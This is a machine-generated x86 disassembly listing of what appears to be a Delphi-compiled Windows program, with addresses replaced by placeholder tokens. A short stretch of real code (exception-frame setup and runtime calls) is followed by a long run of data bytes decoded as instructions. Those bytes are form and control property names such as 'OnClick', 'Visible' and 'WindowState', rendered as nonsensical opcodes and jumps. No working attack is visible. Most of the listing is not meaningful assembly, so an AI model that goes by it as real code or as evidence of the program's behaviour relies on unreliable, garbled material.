mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452c90
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404098
retn
sub_452c98
adc al [ eax ]
add [ eax ] al
fsubr [ eax + ecx * 2 ]
add ah dh
xor eax 0x2cd80048
dec eax
add [ eax - 0x2bffb7cb ] al
sub al 0x48
add [ esi + 0x2cd00048 ] al
dec eax
add [ eax + 0x35 ] dl
dec eax
add ah cl
sub al 0x48
add [ eax - 0x37ffb7c7 ] dh
sub al 0x48
add [ eax + 0x35 ] bl
dec eax
add ah al
sub al 0x48
add [ edi + esi + 0x2cc00048 ] bl
dec eax
add al dl
dec eax
add [ esp + ebp + 0x3a5c0048 ] bh
dec eax
add [ eax + 0x5800482c ] bh
cmp cl [ eax ]
mov ah 0x2c
dec eax
add [ esi + esi + 0x48 ] ah
add [ eax - 0x7ffb7d4 ] dh
cmp [ eax ] ecx
lodsb [ esi ]
sub al 0x48
add [ eax - 0x57ffb7c7 ] bh
sub al 0x48
add ah cl
cmp cl [ eax ]
movsb [ edi ] [ esi ]
sub al 0x48
add [ eax - 0x5fffb7c6 ] al
sub al 0x48
add [ eax + 0x36 ] bh
dec eax
add [ esp + ebp + 0x36900048 ] bl
dec eax
add [ eax - 0x3ffb7d4 ] bl
dec eax
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_452d90
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452d97
retn
mov eax [ rw-data ]
call sub_4032a0
mov eax [ rw-data ]
call sub_4032a0
mov eax [ rw-data ]
call sub_4032a0
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404afc
mov eax rw-data
call sub_404074
sub_452d9c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_452c98
call sub_403d9c
mov eax [ r-xdata ]
call sub_413620
mov eax [ r-xdata ]
call sub_4136c0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41366c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41366c
mov eax [ r-xdata ]
call sub_413564
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4248b4
mov [ rw-data ] eax
sub_452feb
mov esp 0x100455a
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
add [ eax ] al
[ 0x1ff0000 ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
[ eax + 0x100455b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
fcomp [ ebx + 0x45 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
push esp
pop ebx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
popad
outsb
add [ gs : bx + si ] dl
outsd
insb
outsd
jb r-xdata
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add [ eax + 0x21 ] dh
inc esp
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
call 0x1045770b
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] bl
xor [ ebp ] eax
or [ edi + 0x73 ] dh
inc ebp
add [ eax ] cl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ esi ] al
add eax 0x676e6152
add [ gs : eax ] dl
adc [ eax ] al
or al 0x0
add bh bh
aam 0x5a
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
inc ebx
add [ eax + eax + 0xc80044 ] bl
inc esp
add al cl
fild [ ebx ]
add dl dl
inc ebx
add [ ebp + ebx * 8 + 0x43 ] dl
add ah cl
fadd [ ebx ]
loopne r-xdata
rol [ ebx ] 0x1
mov al dl
inc ebx
add [ esi + ebx * 8 + 0x200c0043 ] cl
inc esp
add [ ecx + eax + 0x44 ] cl
add [ esp + eax * 2 ] ch
inc esp
add al ch
inc esp
inc esp
add ah ah
aas
inc esp
add ah cl
inc esp
inc esp
add [ eax + 0x74004565 ] ah
pop edi
inc ebp
add [ eax + 0x2400441a ] bl
pop edi
inc ebp
add [ eax + 0x34004417 ] al
pop edi
inc ebp
add [ eax ] dh
sbb eax [ eax + eax + 0x34 ]
sbb eax [ eax + eax - 0x14 ]
sbb [ eax + eax - 0x6c ] eax
sbb [ eax + eax + 0xc ] eax
inc esi
inc esp
add ah bl
and eax [ eax + eax ]
pop eax
inc esp
add [ eax + 0x78004442 ] cl
inc ebp
inc esp
add [ edi + ebx * 2 + 0x62440045 ] dl
inc ebp
add [ eax + 0x64 ] bh
inc ebp
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
push ecx
inc esp
add [ eax ] bh
sbb [ eax + eax + 0x34 ] eax
inc esp
inc ecx
add ah cl
inc [ ebx ]
add [ eax ] dl
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
dec esi
outsd
jb r-xdata
add [ eax ] al
je r-xdata
enter 0x43d2 0x0
in al dx
add eax 0xdbe00044
inc ebx
add [ eax + ebp * 4 + 0x41 ] ch
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
outsd
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
jmp [ esp + ebx * 2 ]
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ eax + 0x5e ] dh
inc ebp
add [ esp + ecx * 2 ] ah
inc esp
add [ eax + 0x51 ] al
inc esp
add [ eax + edx * 2 - 0x2ec3ffbc ] cl
inc ebx
add [ eax - 0x3fffbbba ] ah
inc esi
inc esp
add al bl
inc ebx
inc esp
add [ eax + edx * 8 - 0x2f77ffbd ] al
inc ecx
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
inc esp
pop esp
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ ecx + esi ] bl
inc ebp
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
shr [ ecx + esi + 0x45 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
xor al [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ edx ] 0x45
add [ esi + 0x1c004532 ] ah
add al [ eax ]
add [ ebx + ebx * 4 - 0x57abffbd ] al
inc ecx
sub_453788
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les edi [ eax ]
inc ebp
add [ eax + 0x3a ] ch
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ah
cmp [ ebp ] al
push esi
cmp al [ ebp ]
clc
add al [ eax ]
add [ eax + 0x31 ] ah
inc ebp
add [ eax + ebp * 4 + 0x41 ] dl
add [ eax + ebp * 2 ] ch
inc ebp
add al ah
imul eax [ ebp ] sub_4034fc
dec esp
mov es [ ebp ]
cmp [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] dl
add [ eax + 0x6a ] cl
inc ebp
add [ eax ] dl
push ecx
inc esp
add [ eax + 0x3400456f ] bh
inc esp
inc ecx
add [ eax ] cl
insb
inc ebp
add [ esp + ebp * 2 + 0x45 ] al
add [ eax + 0x6d ] dl
inc ebp
add al ah
fild [ ebx ]
insb
test al 0x41
add al cl
jne r-xdata
nop
jne r-xdata
add [ ebp + 0x41 ] cl
add [ eax - 0x4f ] ch
inc ebp
add [ eax + 0x24004566 ] ah
dec esp
inc esp
add [ eax + 0x51 ] al
inc esp
add [ eax + edx * 2 - 0x2ec3ffbc ] cl
inc ebx
add [ eax - 0x57ffbbba ] ah
jb r-xdata
xchg esp eax
sbb [ eax + eax + 0xc ] eax
inc esi
add [ esp + esi * 2 + 0x45 ] bl
jl r-xdata
mov al [ 0xffffffffac004565 ]
add al bl
inc ebx
inc esp
add [ eax + edx * 8 - 0x2f77ffbd ] al
inc ebx
add [ ebx + esi * 2 + 0xc80045 ] bl
inc esp
add al cl
fild [ ebx ]
add dl dl
inc ebx
add [ ebp + ebx * 8 + 0x43 ] dl
add [ eax + 0x5c004575 ] dl
je r-xdata
test al 0x6b
inc ebp
add al dh
lodsd [ esi ]
inc ebp
add [ eax + ebp * 2 + 0x45 ] ah
add ah dh
test al 0x45
add ah dl
pop [ ebp ]
test al 0xaa
inc ebp
add [ ebp + esi * 2 + 0xe0045 ] cl
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
cmp al 0x2
add [ eax ] al
enter 0x4533 0x0
push eax
add al [ eax ]
add ah bh
xor eax [ ebp ]
add al [ fs : eax ]
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add [ eax + 0x7000441a ] bl
mov [ ebp ] eax
ror [ ebp + eax * 2 + 0x458b8c00 ] 0x1
add [ eax ] dh
sbb eax [ eax + eax + 0x34 ]
sbb eax [ eax + eax + 0x8 ]
mov es [ ebp ]
inc esp
add ah bh
xchg esp eax
inc ebp
add [ eax ] al
pop eax
inc esp
add [ eax + 0x10004442 ] cl
stosb [ edi ]
inc ebp
add [ edi + ebx * 2 + 0x62440045 ] dl
inc ebp
add al dh
0x6b2c0045 0x45
or al 0x46
add [ esi + ebx * 8 + 0x76080043 ] cl
inc ebp
add [ ecx + eax + 0x44 ] cl
add [ esp + eax * 2 ] ch
inc esp
add al ch
inc esp
inc esp
add ah ah
aas
inc esp
add ah cl
inc esp
inc esp
add [ eax - 0x53ffba9b ] ah
sub_453f9b
sub al 0xfe
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ ecx ] bl
add bh bh
and al 0xdf
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
imul esp [ gs : edi + 0x68 ] 0x40109474
add [ edx + eax ] bh
add bh bh
cmp al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ eax + 0x65 ] cl
insb
jo r-xdata
outsb
je r-xdata
dec ecx
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax ] al
sub al 0x0
or cl [ ebx + 0x65 ]
jns r-xdata
imul ebp [ ebp + 0x30 ] 0x800452f
add al [ eax ]
[ ecx ]
cmp al 0x10
inc eax
add [ eax + eax ] cl
outsd
outsb
je r-xdata
inc esp
add [ eax + 0x2 ] ah
add bh bh
pop esp
add [ ebp ] 0x30
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f0e002f ] al
jb r-xdata
fiadd [ ebx ]
cld
fiadd [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
add al 0x46
outsd
outsb
je r-xdata
mov esp 0x680041
add bh bh
in al dx
js r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
add [ esi ] cl
dec edi
jbe r-xdata
aad 0x43
add ah ch
jno r-xdata
xor al 0x45
add [ edi ] ch
add al [ eax ]
jmp [ eax - 0x7f ]
add [ eax ] al
add [ eax + eax ] dh
insb
jae r-xdata
add [ eax ] 0x0
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
push cs
push eax
popad
jb r-xdata
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
ja r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
or eax 0x7a726f48
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060005 ] al
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
add [ 0x35ff0002 ] dh
add al [ eax ]
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] eax
add [ eax ] al
xor al 0x0
jb r-xdata
jmp edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
inc eax
add [ edx + eax ] dh
rol [ eax + eax + 0x48 ] 0x1
add al [ eax ]
[ eax + 0x30004582 ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4d04002d ] al
outsb
jne r-xdata
mov [ ecx ] 0x40
add al [ eax ]
jmp [ ecx + eax * 4 ]
outsb
aam 0x35
inc ebp
add [ eax + 0x50090032 ] al
outsd
outsb
arpl [ eax + 0xc ] bp
aam 0x44
add [ eax + eax ] bh
push [ eax + 0x300043dd ]
add [ ebp ] 0x80000000
add [ eax ] al
inc eax
add al ah
test [ ebp ] al
in al dx
test [ ebp ] al
xor [ ecx + 0x45 ] al
add [ eax + 0x1 ] al
xor eax 0x63530600
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
outsb
jne r-xdata
outsb
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x3c65646f
adc [ eax ] al
jl r-xdata
add [ eax ] al
popad
je r-xdata
add bh bh
xor al 0x2
adc [ eax ] al
xor al 0x2
jo r-xdata
fld [ ebx ]
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ eax + 0x6f ] edx
xor eax [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
xor al 0x45
add [ eax ] dh
add al [ eax ]
inc esp
test [ ebp ] al
xor [ ecx + 0x45 ] al
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
dec [ eax - 0x21 ]
inc ebx
add [ eax ] dl
fild [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
push ebx
outsb
popad
jo r-xdata
outsd
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : esi ] cl
dec edi
insb
inc ebx
jb r-xdata
add al [ eax ]
push [ edx + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0031 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
inc ebp
add [ eax ] al
dec edi
jb r-xdata
or al 0x0
or eax 0x74726556
adc [ eax ] al
in al 0x2
add bh bh
in al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
cmp [ eax ] al
or dl [ ebx + 0x6e ]
popad
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or eax 0x65786950
jb r-xdata
adc [ eax ] al
push edi
add [ eax ] al
jmp esp
add [ eax ] al
add [ ecx ] bh
add [ edi ] al
jne r-xdata
add [ eax + 0x4584 ] dl
int3
add [ eax ] al
inc eax
add [ eax ] al
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f0b003d ] al
je r-xdata
sub eax [ edx ]
add bh bh
fadd [ ebp - 0x7ecfffbb ]
add [ 0x74646957 ] al
push r-xdata
jb r-xdata
jne r-xdata
jpe r-xdata
popad
outsb
push edx
jae r-xdata
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
je r-xdata
das
inc ebp
add [ edx + eax ] cl
add bh bh
cmp al 0x61
inc ebp
add [ eax ] dh
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x560d000c ] al
jb r-xdata
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
inc ebx
add [ eax ] cl
dec edi
jb r-xdata
push ecx
rcl [ ebx ] 0x41
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
outsb
inc ebx
dec edi
pop eax
int3
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push esi
imul esi [ ebx + 0x69 ] 0x3c656c62
adc [ eax ] al
dec eax
add [ eax ] al
push [ ebp + edx * 8 + 0x71ec0043 ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
add [ esi + edi * 8 + 0x43 ] cl
add [ eax ] al
cmp [ eax ] eax
pop es
add [ eax + 0x2 ] bl
add bh bh
add [ edx - 0x7ecfffbb ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x570a003b ] al
imul ebp [ esi + 0x64 ] 0x654d776f
outsb
jne r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ edi + ecx * 2 ] cl
popad
je r-xdata
rcl [ gs : ebx ] 0x41
mov eax 0xc8004392
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130041 ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
xor [ ecx + 0x45 ] al
add [ eax ] al
adc eax [ ecx ]
mov [ edx ] al
add bh bh
mov [ edx ] al
add bh bh
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or cl [ edi + 0x6e ]
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
dec edi
or al 0x90
inc ebx
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0047 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ eax ] ch
add [ eax ] eax
[ eax ]
rcl [ ebx ] 0x41
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
inc ebp
add [ ecx ] cl
dec edi
jb r-xdata
inc ebx
insb
outsd
jae r-xdata
dec eax
xchg edx eax
inc ebx
add al al
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
outsb
inc esp
jb r-xdata
or [ edi + 0xe80043 ] cl
add bh bh
call 0x31444531
jb r-xdata
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f0a0044 ] al
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
test al 0x36
inc ebp
add [ eax - 0x6700fffe ] bl
add al [ eax ]
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f0c0040 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add bh bh
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
dec edi
add [ ecx ] cl
dec edi
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0xc06f666e
adc eax [ ecx ]
mov al 0x2
add bh bh
mov al 0x2
add bh bh
xor [ ecx + 0x45 ] al
outsb
dec eax
imul esp [ ebp + 0x28 ] 0xa8004537
add al [ eax ]
[ eax + 0x1ff0002 ]
outsb
outsw
rcl [ ebx ] 0x41
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f06004d ] al
jo r-xdata
imul ecx [ edi + 0x76 ] 0x65
pop [ ebx ]
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ebx
add [ ecx ] cl
dec edi
outsb
nop
inc ebx
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
jns r-xdata
outsb
inc esp
jae r-xdata
add [ eax + 0x4f090045 ] al
js r-xdata
outsb
inc ebx
jb r-xdata
add al [ eax ]
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f080043 ] al
push ecx
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ esi ] 0xc
dec edi
mov es [ ebx ]
[ eax ] al
push eax
add [ eax ] al
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f0a004a ] al
outsb
inc esp
jb r-xdata
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f0a0049 ] al
add [ eax ] al
push [ eax ]
pop [ ebx ]
call 0xffffffffe944452d
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x44 ] bp
xchg ecx eax
inc ebx
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi + 0x6e ] ecx
jb r-xdata
add bh bh
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
inc esp
add [ edx ] cl
dec edi
adc eax [ ecx ]
mov al [ 0xffffffffa0ff0002 ]
add al [ eax ]
push [ eax ]
add [ eax - 0x5f00fffe ] ah
push eax
outsd
jo r-xdata
loopne r-xdata
jo r-xdata
lea eax [ ebx ]
inc esp
mov es [ ebx ]
loopne r-xdata
add [ eax - 0x80000000 ] al
add [ eax ] al
dec edi
jbe r-xdata
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f0c0046 ] al
mov al [ 0x30ff0002 ]
jo r-xdata
add bh bh
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
push esp
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
dec ebp
outsd
jne r-xdata
lea eax [ ebx ]
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
push edx
add [ ebx ] cl
dec edi
outsb
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
jmp eax
add bh bh
loopne r-xdata
dec ebp
add [ esi ] al
dec edi
outsb
inc ebx
outsd
outsb
jae r-xdata
inc ecx
add [ ebx ] dl
dec edi
adc eax [ ecx ]
rol [ edx ] 0x1
add bh bh
rol [ edx ] 0x1
add bh bh
outsd
jne r-xdata
push ebp
jo r-xdata
insb
rcl [ ebx + 0x1400043 ] 0x1
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f100056 ] al
inc esp
outsd
ja r-xdata
in al dx
inc ebp
add al al
add al [ eax ]
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
outsb
push ebx
push 0x4374726f
jne r-xdata
rcl [ ebx + 0x1480043 ] 0x1
add bh bh
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0057 ] al
outsb
dec ebp
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
sbb al 0x8d
inc ebx
add al ah
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f0a0050 ] al
outsb
dec ebx
jns r-xdata
add bh bh
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
push eax
add [ edx ] cl
dec edi
adc eax [ ecx ]
enter 0x2 0xff
enter 0x2 0xff
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
pop ebx
add [ esi ] al
dec edi
push edi
push 0x556c6565
jo r-xdata
push edi
xchg ebx eax
inc ebx
add [ eax ] bh
add [ eax ] eax
jae r-xdata
push edi
xchg esp eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x49
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x49 ] ch
inc ebp
add [ eax - 0x7ffbab7 ] ah
outsb
push ebx
push 0x9170776f
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
rcl [ ebx ] 0x41
add al cl
add al [ eax ]
dec eax
add al [ eax ]
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f06005b ] al
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
xor [ ecx + 0x45 ] al
add [ eax - 0x80000000 ] al
push ebx
add [ ebx ] cl
jb r-xdata
add [ eax ] dl
push ecx
inc esp
add [ eax + 0x3400456f ] bh
inc esp
inc ecx
add [ esp + esi * 4 + 0x6c440045 ] ch
inc ebp
add [ eax + 0x6d ] dl
inc ebp
add al ah
fild [ ebx ]
insb
test al 0x41
add al cl
jne r-xdata
inc ebp
add ah bh
xor al 0x40
add [ esi + ecx * 4 + 0x45 ] cl
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
dec eax
push 0x45
jb r-xdata
outsb
add [ eax ] al
adc [ esi ] 0x10
dec edi
adc eax [ ecx ]
mov eax 0xb8ff0002
add al [ eax ]
push [ eax ]
add [ ebp ] 0x80000000
add [ eax ] al
add [ eax + 0x4f070058 ] al
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
je r-xdata
jpe r-xdata
nop
jne r-xdata
add [ ebp + 0x41 ] cl
add [ eax - 0x4f ] ch
inc ebp
add [ eax - 0x4d ] al
inc ebp
add [ esp + ecx * 2 ] ah
inc esp
add [ eax + 0x51 ] al
inc esp
add [ eax + edx * 2 - 0x2ec3ffbc ] cl
inc ebx
add [ eax - 0x57ffbbba ] ah
jb r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
inc esp
add al [ eax ]
add [ edi + esi - 0x57abffbb ] al
inc ecx
add [ eax + ebp * 2 ] ch
inc ebp
add al ah
imul eax [ ebp ] sub_4034fc
dec esp
mov es [ ebp ]
cmp [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] dl
add [ eax + 0x6a ] cl
inc ebp
push 0xa0004549
dec ecx
inc ebp
add al bh
outsd
arpl [ ebx + 0x4 ] bp
xchg ecx eax
inc ebx
add al dh
